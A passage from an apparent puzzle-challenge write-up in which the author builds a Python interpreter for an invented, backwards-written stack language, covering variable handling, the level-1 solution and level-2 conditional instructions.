<span class="line"><span style="color:#4D9375">        while</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">&#x3C;</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">)</span><span style="color:#CB7676"> and</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> in</span><span style="color:#DBD7CAEE"> string</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ascii_lowercase </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> string</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">digits </span><span style="color:#CB7676">+</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">._</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            varname </span><span style="color:#666666">+=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#C99076">            self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">        assert</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">&#x3C;</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">=</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            variables</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">varname</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">pop</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#C99076">            self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#4D9375">        else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">            assert</span><span style="color:#DBD7CAEE"> varname </span><span style="color:#CB7676">in</span><span style="color:#DBD7CAEE"> variables</span></span>
<span class="line"><span style="color:#DBD7CAEE">            stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">variables</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">varname</span><span style="color:#666666">])</span></span>
<span class="line"></span></code></pre>
<p>Not much to say on this code, it’s just the implementation of what I have explained in the first part.</p>
<p>We known that we can parse every line separately, so we iterate through them and execute them one by one to get the password of the first level.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> run_all</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    final </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> line </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> code</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">splitlines</span><span style="color:#666666">():</span></span>
<span class="line"><span style="color:#DBD7CAEE">        instrs </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">split</span><span style="color:#666666">()[::</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#DBD7CAEE">        final </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> parse_line</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> final</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> parse_line</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    instr_ind </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span></span>
<span class="line"><span style="color:#DBD7CAEE">    result </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span></span>
<span class="line"><span style="color:#4D9375">    while</span><span style="color:#DBD7CAEE"> instr_ind </span><span style="color:#CB7676">&#x3C;</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">        result </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> Instr</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">instrs</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">instr_ind</span><span style="color:#666666">]).</span><span style="color:#DBD7CAEE">eval</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">        instr_ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> result</span></span>
<span class="line"></span></code></pre>
<p>password: <code>3314p1848m5l348_6tz1817236bv31536908260dp033188sjuvq17633170412113334-425xprz34x0tg22xq</code></p>
<p>Obviously this is not the code I initially written, I solved the first level with a orrible script. After I’ve seen that the complexity of the levels were rising, I restarted and this is an extract of the final code.</p>
<h4 id="level-2">Level 2</h4>
<p>In level 2 we are introduced with conditional statements. Reversing the blocks of the line, they can be in two forms:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>BOH {condition} | {if true} HOB</span></span>
<span class="line"><span></span></span></code></pre>
<p>equivalent to:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>if (condition) {</span></span>
<span class="line"><span>    if true</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span></code></pre>
<p>or:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>BOH {condition1} | {if true 1} OH {condition2} | {if true 2} {if false} HO HOB</span></span>
<span class="line"><span></span></span></code></pre>
<p>equivalent to:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>if (condition1) {</span></span>
<span class="line"><span>    if true 1</span></span>
<span class="line"><span>} else if (condition2) {</span></span>
<span class="line"><span>    if true 2</span></span>
<span class="line"><span>} else {</span></span>
<span class="line"><span>    if false</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span></code></pre>
<p>So <code>BOH</code> is closed by <code>HOB</code> and <code>OH</code> is closed by <code>HO</code>, expecting nested ifs in the next levels, I haven’t distinguished between <code>BOH</code> and <code>OH</code> and treated everything in the form:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>if (condition) {</span></span>
<span class="line"><span>    if true</span></span>
<span class="line"><span>} else {</span></span>
<span class="line"><span>    if false</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span></code></pre>
<p>The condition statements are terminated by two letters that identifies the comparison to do and they work similarly to the operations: they take the two top values on the stack and compare them.</p>
<p>The type of comparison are the classic ones (read them backward): <code>QE</code> is <code>==</code>, <code>TL</code> is <code>&#x3C;</code> and so on.</p>
<p>We also have boolean operator (<code>AND</code> and <code>OR</code>) between the conditional statements.</p>
<h4 id="second-interpreter">Second interpreter</h4>
<p>We create a subclass of <code>Instr</code> for the conditional instructions, that overwrite <code>eval</code> and <code>parse_var</code> (<code>parese_var</code> is just for error checking, since we cannot have an assignement in a conditional statement):</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">class</span><span style="color:#5DA994"> CondInstr</span><span style="color:#666666">(</span><span style="color:#80A665">Instr</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#CB7676">    def</span><span style="color:#B8A965"> __init__</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> code</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#B8A965">        super</span><span style="color:#666666">().</span><span style="color:#B8A965">__init__</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    def</span><span style="color:#B8A965"> eval</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">        while</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">&#x3C;</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">            if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">B</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">parse_str</span><span style="color:#666666">())</span></span>
<span class="line"><span style="color:#4D9375">            elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">P</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                assert</span><span style="color:#4D9375"> False</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Conditional print</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#4D9375">            elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">N</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">parse_int</span><span style="color:#666666">())</span></span>
<span class="line"><span style="color:#4D9375">            elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">V</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#C99076">                self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">parse_var</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">            else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">                num2 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">pop</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">                num1 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">pop</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">                if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                    assert</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">:</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">ADD</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">num1 </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> num2</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">                elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">S</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                    assert</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">:</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">SUB</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">num1 </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> num2</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">                elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">M</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                    assert</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">:</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">MUL</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">num1 </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE"> num2</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">                elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">D</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                    assert</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">:</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">DIV</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#4D9375">                    assert</span><span style="color:#DBD7CAEE"> num2 </span><span style="color:#CB7676">!=</span><span style="color:#4C9A91"> 0</span></span>
<span class="line"><span style="color:#DBD7CAEE">                    stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">num1 </span><span style="color:#CB7676">//</span><span style="color:#DBD7CAEE"> num2</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">                # conditions</span></span>
<span class="line"><span style="color:#4D9375">                else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">                    assert</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 2</span><span style="color:#CB7676"> ==</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">                    if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">:</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">QE</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#758575DD">  # ==</span></span>
<span class="line"><span style="color:#4D9375">                        return</span><span style="color:#DBD7CAEE"> num1 </span><span style="color:#CB7676">==</span><span style="color:#DBD7CAEE"> num2</span></span>
<span class="line"><span style="color:#4D9375">                    elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">:</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">EL</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#758575DD">  # &#x3C;=</span></span>
<span class="line"><span style="color:#4D9375">                        return</span><span style="color:#DBD7CAEE"> num1 </span><span style="color:#CB7676">&#x3C;=</span><span style="color:#DBD7CAEE"> num2</span></span>
<span class="line"><span style="color:#4D9375">                    elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">:</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">TL</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#758575DD">  # &#x3C;</span></span>
<span class="line"><span style="color:#4D9375">                        return</span><span style="color:#DBD7CAEE"> num1 </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> num2</span></span>
<span class="line"><span style="color:#4D9375">                    elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">:</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">TG</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#758575DD">  # ></span></span>
<span class="line"><span style="color:#4D9375">                        return</span><span style="color:#DBD7CAEE"> num1 </span><span style="color:#CB7676">></span><span style="color:#DBD7CAEE"> num2</span></span>
<span class="line"><span style="color:#4D9375">                    elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">:</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">EG</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#758575DD">  # >=</span></span>
<span class="line"><span style="color:#4D9375">                        return</span><span style="color:#DBD7CAEE"> num1 </span><span style="color:#CB7676">>=</span><span style="color:#DBD7CAEE"> num2</span></span>
<span class="line"><span style="color:#4D9375">                    elif</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">:</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">EN</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#758575DD">  # !=</span></span>
<span class="line"><span style="color:#4D9375">                        return</span><span style="color:#DBD7CAEE"> num1 </span><span style="color:#CB7676">!=</span><span style="color:#DBD7CAEE"> num2</span></span>
<span class="line"><span style="color:#4D9375">                    else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#B8A965">                        print</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#B8A965">                        print</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">,</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#4D9375">                        assert</span><span style="color:#4D9375"> False</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Unknown condition</span><span style="color:#C98A7D77">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C99076">                self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 3</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">    def</span><span style="color:#80A665"> parse_var</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#CB7676">        global</span><span style="color:#DBD7CAEE"> variables</span></span>
<span class="line"><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"><span style="color:#DBD7CAEE">        varname </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">        while</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">&#x3C;</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">)</span><span style="color:#CB7676"> and</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> in</span><span style="color:#DBD7CAEE"> string</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ascii_lowercase </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> string</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">digits </span><span style="color:#CB7676">+</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">._</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">            varname </span><span style="color:#666666">+=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#C99076">            self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">        assert</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind </span><span style="color:#CB7676">&#x3C;</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">        assert</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">[</span><span style="color:#C99076">self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ind</span><span style="color:#666666">]</span><span style="color:#CB7676"> !=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">=</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Conditional assignement</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#4D9375">        assert</span><span style="color:#DBD7CAEE"> varname </span><span style="color:#CB7676">in</span><span style="color:#DBD7CAEE"> variables</span></span>
<span class="line"><span style="color:#DBD7CAEE">        stack</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">variables</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">varname</span><span style="color:#666666">])</span></span>
<span class="line"></span></code></pre>
<p>We create a function to evaluate a condition considering the boolean operators:</p>
